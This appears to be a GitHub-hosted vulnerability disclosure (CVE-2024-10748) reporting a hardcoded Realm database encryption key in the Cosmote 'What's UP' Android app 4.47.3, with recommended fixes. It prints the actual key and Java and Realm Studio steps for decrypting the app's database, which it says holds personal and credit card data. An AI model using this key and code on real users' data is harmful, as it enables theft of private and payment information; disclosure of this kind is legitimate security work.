=== Content from github.com_432e696c_20250114_185349.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsecuserx%2FCVE%2Fblob%2Fmain%2F%255BHardcoded%2520Realm%2520Database%2520Encryption%2520Key%255D%2520found%2520in%2520What%27s%2520UP%2520Android%2520App%25204.47.3%2520-%2520%28RealmDB.java%29.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsecuserx%2FCVE%2Fblob%2Fmain%2F%255BHardcoded%2520Realm%2520Database%2520Encryption%2520Key%255D%2520found%2520in%2520What%27s%2520UP%2520Android%2520App%25204.47.3%2520-%2520%28RealmDB.java%29.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=secuserx%2FCVE)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[secuserx](/secuserx)
/
**[CVE](/secuserx/CVE)**
Public

* [Notifications](/login?return_to=%2Fsecuserx%2FCVE) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fsecuserx%2FCVE)
* [Star
   2](/login?return_to=%2Fsecuserx%2FCVE)

* [Code](/secuserx/CVE)
* [Issues
  0](/secuserx/CVE/issues)
* [Pull requests
  0](/secuserx/CVE/pulls)
* [Actions](/secuserx/CVE/actions)
* [Projects
  0](/secuserx/CVE/projects)
* [Security](/secuserx/CVE/security)
* [Insights](/secuserx/CVE/pulse)

Additional navigation options

* [Code](/secuserx/CVE)
* [Issues](/secuserx/CVE/issues)
* [Pull requests](/secuserx/CVE/pulls)
* [Actions](/secuserx/CVE/actions)
* [Projects](/secuserx/CVE/projects)
* [Security](/secuserx/CVE/security)
* [Insights](/secuserx/CVE/pulse)

## Files

 main
## Breadcrumbs

1. [CVE](/secuserx/CVE/tree/main)
/
# [Hardcoded Realm Database Encryption Key] found in What's UP Android App 4.47.3 - (RealmDB.java).md

Copy path Blame  Blame
## Latest commit

## History

[History](/secuserx/CVE/commits/main/%5BHardcoded%20Realm%20Database%20Encryption%20Key%5D%20found%20in%20What%27s%20UP%20Android%20App%204.47.3%20-%20%28RealmDB.java%29.md)194 lines (111 loc) · 5.45 KB main
## Breadcrumbs

1. [CVE](/secuserx/CVE/tree/main)
/
# [Hardcoded Realm Database Encryption Key] found in What's UP Android App 4.47.3 - (RealmDB.java).md

Top
## File metadata and controls

* Preview
* Code
* Blame

194 lines (111 loc) · 5.45 KB[Raw](https://github.com/secuserx/CVE/raw/refs/heads/main/%5BHardcoded%20Realm%20Database%20Encryption%20Key%5D%20found%20in%20What%27s%20UP%20Android%20App%204.47.3%20-%20%28RealmDB.java%29.md)
# CVE-2024-10748 - [Hardcoded Realm Database Encryption Key] found in What's UP Android App 4.47.3 - (RealmDB.java)

Affected Project: **WHAT'S UP 4.47.3**

Exploit Author: Dimitris Chatzidimitris

Platform: Android

Vendor: Cosmote Greece

Official Application Link: (<https://play.google.com/store/apps/details?id=gr.cosmote.whatsup>)

Version: 4.47.3

Updated: Oct 10, 2024

> Installs: 5,000,000+

> Category: Tools

> Android Version Code: 2410115

> File Name: gr.cosmote.whatsup.apk

> Size: 20.06MB

> SHA256: 56fcd6278c70af76b342bd3374b5322d0531a5fe6db8a4dffdcd8002ade59d51

## Description:

The application embeds a hardcoded encryption key `(defaultRealmKey)` within the source code file `gr/desquared/kmmsharedmodule/db/RealmDB.java`. This key is used to encrypt the Realm database file named `defaultKMMV4.realm.enc`. Because the encryption key is hardcoded and packaged inside the APK, an attacker can extract it from the APK file. This exposure enables the attacker to decrypt the database file, leading to unauthorized access to confidential user information, including sensitive personal data and credit card details.

## Root cause:

Vulnerability found at: **RealmDB.java**

Path: gr/desquared/kmmsharedmodule/db/RealmDB.java

## Vulnerability Analysis:

Tool for decompiling the simple architect .apk or bundle file: [Jadx](https://github.com/skylot/jadx)

The RealmDB class in RealmDB.java is responsible for managing the encrypted Realm database within the mobile application:

```
public final class RealmDB {
    public static final String ENCRYPTED_REALM = "ENCRYPTED_REALM";
    public static final RealmDB INSTANCE = new RealmDB();
    private static final String databaseName = "defaultKMMV4";
    private static final String defaultRealmKey = "1234567812345678123456781234567812345678123456781234567812345678";
    private static final String encryptedRealmFileName = "defaultKMMV4.realm.enc";
    private static final long encryptedRealmVersion = 80;

```

Within this class there is a hardcoded encryption key used for securing the database:

```
private static final String defaultRealmKey = "1234567812345678123456781234567812345678123456781234567812345678";

```

The encryption key can be used to decrypt the application Realm database !

## Impact

1. Predictable Key: A hardcoded encryption key, especially one that is the same across all installations of the application, is inherently insecure. Attackers who decompile the application can easily extract this key.
2. Ease of Decryption: With access to the encryption key, an attacker can decrypt the database contents if they gain access to the device or a backup of the application's data, compromising sensitive user information.
3. Regulatory Non-Compliance: As the application stores personal data and credit cards info, the use of weak encryption practices may violate data protection regulations like GDPR, HIPAA, etc.

## Decryption sample code

The defaultRealmKey string is converted into a byte array before being used.

Convert the Encryption Key:

```
// Java example
String defaultRealmKey = "1234567812345678123456781234567812345678123456781234567812345678";
byte[] keyBytes = defaultRealmKey.getBytes(StandardCharsets.UTF_8);

```

Configure Realm with the Encryption Key:

```
// Java example
RealmConfiguration config = new RealmConfiguration.Builder()
    .name("defaultKMMV4.realm.enc")
    .encryptionKey(keyBytes)
    .schemaVersion(80)
    .build();

```

Open the Encrypted Realm:

```
// Java example
Realm realm = Realm.getInstance(config);

```

Access and Export Data:

```
// Java example
RealmResults<YourRealmObject> results = realm.where(YourRealmObject.class).findAll();

```

## Alternative decryption method: Using Realm Studio

Convert the Key to Hexadecimal Format as Realm Studio requires the encryption key in hexadecimal format:

```
// Java code
String defaultRealmKey = "1234567812345678123456781234567812345678123456781234567812345678";
byte[] keyBytes = defaultRealmKey.getBytes(StandardCharsets.UTF_8);

// Convert byte array to hex string
StringBuilder hexString = new StringBuilder();
for (byte b : keyBytes) {
    String hex = String.format("%02x", b);
    hexString.append(hex);
}

String encryptionKeyHex = hexString.toString();

```

Now launch Realm Studio.
Open the encrypted Realm file (defaultKMMV4.realm.enc).

When prompted, enter the hexadecimal encryption key (encryptionKeyHex).

## Recommendations for Secure Encryption Key Management

1. **Use the Android Keystore System for Secure Key Storage**

**Benefits:**

**Hardware-backed Security:** Keys can be stored in hardware-backed keystores on devices that support it.

**Isolation:** Keys are stored outside the app's process space, making them more resistant to extraction.

2. **Generate Unique Encryption Keys per Device or User**

**Benefits:**

Using unique keys minimizes the impact if a key is compromised. It ensures that only data on a particular device or user account is at risk, not all users.

**Methods:**
**Per-Device Keys:** Generate a key during the first launch of the app and store it securely.

**Per-User Keys:** If your app has user authentication, derive the key from user-specific credentials.

3. **Use a Key Derivation Function (KDF)**

**Benefits:**

Even if the KDF parameters are known, without the original input (password/PIN), the key cannot be derived.

**Choose a Strong KDF:** For example PBKDF2.

> One Click Can Change Everything: Be Secure.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


